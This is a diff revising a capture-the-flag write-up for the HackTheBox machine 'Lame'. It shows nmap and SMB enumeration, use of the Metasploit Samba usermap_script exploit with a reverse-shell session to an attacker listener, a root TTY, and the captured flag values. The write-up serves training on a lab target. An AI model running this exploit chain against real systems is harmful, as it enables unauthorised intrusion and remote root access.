@@ -1,87 +1,88 @@
 # HTB: Lame
+
+## Engagement Overview
+**Target:** Lame (HTB)  
+**Box IP:** 10.10.10.3  
+**Local IP:** (recorded in original notes)  
 **Date:** 2025-07-02
 
-## 🔍 Enumeration
+---
+
+### Objectives
+- Enumerate network services (SMB/FTP/SSH) and writable shares.  
+- Exploit Samba (usermap_script) to gain command execution.  
+- Escalate to root and capture flags.
+
+---
+
+## Service Enumeration
+
 ```bash
 nmap -p- --min-rate=1000 -T4 10.10.10.3
 ```
-**Results:**
-```
-PORT     STATE SERVICE
-21/tcp   open  ftp
-22/tcp   open  ssh
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-3632/tcp open  distccd
-```
 
-### SMB Enumeration
-```bash
-smbmap -H 10.10.10.3
-```
-**Results:**
-```
-[+] IP: 10.10.10.3:445	Name: 10.10.10.3          	Status: Authenticated
-	Disk    | Permissions | Comment
-	--------|-------------|--------------------------
-	print$  | NO ACCESS   | Printer Drivers
-	tmp     | READ, WRITE | oh noes!
-	opt     | NO ACCESS   | 
-	IPC$    | NO ACCESS   | IPC Service (Samba 3.0.20-Debian)
-	ADMIN$  | NO ACCESS   | IPC Service (Samba 3.0.20-Debian)
-```
+**Relevant ports discovered:**  
+- 21/tcp ftp (vsftpd)  
+- 22/tcp ssh  
+- 139/tcp netbios-ssn  
+- 445/tcp microsoft-ds (Samba)  
+- 3632/tcp distccd
 
-```bash
-smbclient -N \\10.10.10.3\tmp
-```
-Successfully connected and browsed the `tmp` share.
+SMB shares (from smbmap): `tmp` share is READ,WRITE — usable for uploads.
 
 ---
 
-## Exploitation
+## Initial Access
 
-### FTP – Vsftpd 2.3.4 (CVE-2011-2523)
-- **Exploit Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
-- **Outcome:** Not exploitable — port 6200 blocked by firewall.
-
-### SMB – Samba 3.0.20-Debian (CVE-2007-2447)
-- **Exploit Used:** `exploit/multi/samba/usermap_script`  
-- **Vulnerability:** Username map script command execution  
-- **Payload:** Reverse TCP shell via Metasploit
-
+### SMB foothold
 ```bash
+smbmap -H 10.10.10.3
+smbclient -N \\10.10.10.3\tmp
+# connected to tmp share and uploaded/executed payload via exploit flow
+```
+
+### Exploitation attempted/used
+- vsftpd 2.3.4 backdoor (CVE-2011-2523) noted but port filtered/unusable.  
+- Successfully used `exploit/multi/samba/usermap_script` (Metasploit) to execute commands, resulting in a reverse shell to attacker listener.
+
+```text
+# msf console snippet
 msf6 > use exploit/multi/samba/usermap_script
-```
-```
-[*] Started reverse TCP handler on 10.10.16.5:4444 
+[*] Started reverse TCP handler on 10.10.16.5:4444
 [*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.3:43580)
 ```
 
-## Privilege Escalation
+Upgraded shell and spawned an interactive TTY:
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 id
-uid=0(root) gid=0(root)
-```
-
-**Flags:**
-```bash
-cat /home/makis/user.txt
-e95ac31f8132e26eac44c2fe58792cfa
-
-cat /root/root.txt
-4f8f2ae18815f97ffdf7975965d6b624
+# uid=0(root) gid=0(root)
 ```
 
 ---
 
-## Tools Used
-- `nmap`, `smbmap`, `smbclient`, `metasploit`, `searchsploit`, `nc`, `netstat`
+## Privilege Escalation
+
+- Post-exploit TTY indicates root obtained via exploit flow; no additional privesc steps required.
+
+---
+
+## House Cleaning / Post-Exploitation
+
+**Flags:**  
+- `user.txt`: `e95ac31f8132e26eac44c2fe58792cfa`  
+- `root.txt`: `4f8f2ae18815f97ffdf7975965d6b624`
+
+- Removed any uploaded artifacts where applicable.  
+
+---
+
+## Tools Utilized
+- nmap, smbmap, smbclient, metasploit, nc, python
 
 ---
 
 ## Key Takeaways
-- Exploiting outdated Samba services is still viable on legacy boxes.
-- Port filtering can block shell return paths even if a vuln exists (FTP port 6200).
-- Always enumerate SMB shares even without creds — `smbclient` often provides an initial foothold.
-- Samba CVE-2007-2447 is a classic — worth mastering for CTFs and exams like OSCP.
+- Writable SMB shares are useful for dropping/executing payloads.  
+- Samba `usermap_script` exploit remains relevant for legacy systems.  
+- Always test multiple attack vectors (FTP, SMB) when initial paths are filtered.
